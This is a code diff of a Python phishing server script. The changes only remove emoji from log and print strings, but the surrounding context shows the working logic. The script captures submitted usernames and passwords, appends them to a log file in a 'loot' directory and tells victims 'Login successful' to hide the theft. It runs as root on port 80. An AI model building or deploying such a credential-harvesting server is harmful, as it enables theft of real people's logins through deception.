@@ -31,12 +31,12 @@ class PhishHandler(SimpleHTTPRequestHandler):
             password = creds.get("password", [""])[0]
 
             with open(LOG_FILE, "a") as f:
-                f.write(f"💀 USERNAME: {username} | PASSWORD: {password}\n")
+                f.write(f" USERNAME: {username} | PASSWORD: {password}\n")
 
             self.send_response(200)
             self.send_header("Content-type", "text/html")
             self.end_headers()
-            self.wfile.write("<h3>✅ Login successful. You are now connected.</h3>".encode())
+            self.wfile.write("<h3> Login successful. You are now connected.</h3>".encode())
         else:
             self.send_error(404)
 
@@ -45,9 +45,9 @@ if __name__ == "__main__":
     require_root()
     os.chdir("loot")
     server = HTTPServer(('0.0.0.0', 80), PhishHandler)
-    print("🌐 Phishing server running on http://0.0.0.0:80 ...")
+    print(" Phishing server running on http://0.0.0.0:80 ...")
     try:
         server.serve_forever()
     except KeyboardInterrupt:
-        print("🛑 Server stopped.")
+        print(" Server stopped.")
         server.server_close()
